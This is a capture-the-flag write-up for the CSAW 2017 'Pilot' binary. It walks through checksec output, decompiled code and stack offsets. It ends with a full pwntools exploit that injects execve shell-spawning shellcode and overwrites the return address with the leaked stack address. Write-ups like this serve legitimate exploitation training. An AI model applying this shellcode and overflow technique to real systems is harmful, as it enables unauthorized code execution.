# Pilot

Full disclosure, a teammate of mine solved this challenge while I was working on SVC, so I solved this after the competition. In addition to that, the shellcode I used is from this other writeup  of the this challenge:

https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/

Let's take a look at the challenge:
```
$	file pilot 
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
$	pwn checksec pilot 
[*] '/Hackery/csaw17/pilot-pwn-75/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
So we can see that it is a 64 bit elf, without NX, a Stack Canary, or PIE. Let's run it:

```
$	./pilot 
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffe1b239cb0
[*]Command:gimme that flag
```

So it starts off by printing out a bunch of text, then gives us what appears to be a stack address, then prompts us for input. Let's try to break it:

```
$	python -c 'print "0"*1000' | ./pilot 
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7fff8f8a6770
[*]Command:Segmentation fault (core dumped)
```

So by throwing 1000 bytes worth of `'0'`, we managed to break it. It is probably a buffer overflow vulnerabillity. Looking at the code in IDA, the following bit of code sticks out:

```
  if ( read(0, &buf, 0x40uLL) <= 4 )
  {
    LODWORD(v11) = std::operator<<<std::char_traits<char>>(&std::cout, "[*]There are no commands....");
    std::ostream::operator<<(v11, &std::endl<char,std::char_traits<char>>);
    LODWORD(v12) = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Mission Failed....");
    std::ostream::operator<<(v12, &std::endl<char,std::char_traits<char>>);
    result = 0xFFFFFFFFLL;
  }
```

That call to read is where our input is scanned into memory. We can see that if it scans in less than 4 bytes into memory, it will print out a `Mission Failed` statement. SO we can see that it is scanning in `0x40` bytes into memory into `buf`. 

```
-0000000000000020 buf             db 32 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
```

Here we can that our input is being scanned into `rbp-0x20`. We can see that the return address is stored at `rbp+0x8`. With the `0x40` bytes of data we get to write with the read call, we can overwrite the return address. Now about that infoleak:

```
  std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
  LODWORD(v9) = std::operator<<<std::char_traits<char>>(&std::cout, "[*]Location:");
  LODWORD(v10) = std::ostream::operator<<(v9, &buf);
```

Here we can see the infoleak being printed. We can also see that the address being printed is that of `buf`, which is where our input is stored. So we have the address for the start of our input.

With these two things, we should be able to simply push shellcode onto the stack, then overwrite the return address to point to the start of our shellcode. That way when the function returns, it will execute our shellcode.

Now one thing to note, our shellcode has to be under 32 bytes. The reason for this being is that `buf` is only 32 bytes, and then there is `rbp` which takes up the 8 bytes between `buf` and the return address. When the code calls the leave instruction before it returns, it pops a value into the `rbp` register and will overwrite anything that is in it. So we have to if our shellcode into 32 bytes.

 Now our exploit will look like this:
 
 ```
 4 NOP instructions
 shellcode (24 bytes)
 12 NOP instruction (really doesn't matter what this us)
infoleak address (start of our input)
 ```
 
 We will throw 4 NOP instructions (NOP just runs the next instruction) in the beginning, just to give us a little room for error (we shouldn't need it). Then our shellcode will fill up the rest of the 32 bytes. Here is the exploit:
 
```
#Import pwntools
from pwn import *

#Establish the target
target = process('./pilot')
context.binary = ELF('pilot')
#target = remote("pwn.chal.csaw.io", 8464)

#Attach gdb
#gdb.attach(target, gdbscript = 'b *0x400ae0')

#Print out the initial text
print target.recvuntil("[*]Good Luck Pilot!....")

#Scan in and filter out the infoleak
target.recvline()
leak = target.recvline()
print leak
leak = leak.replace("[*]Location:", "")
leak = int(leak, 16)

#Print out the infoleak, then prompt for input as a break
log.info("The leak is: " + hex(leak))
print target.recvuntil("[*]Command:", "")

#Establish the shellcode, the offsets, and the payload
shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
offset0 = "\x90"*4
offset1 = "\x90"*12
payload = offset0 + shellcode + offset1 + p64(leak)

#Send the payload
target.send(payload)

#Drop to an interactive shell
target.interactive()
```
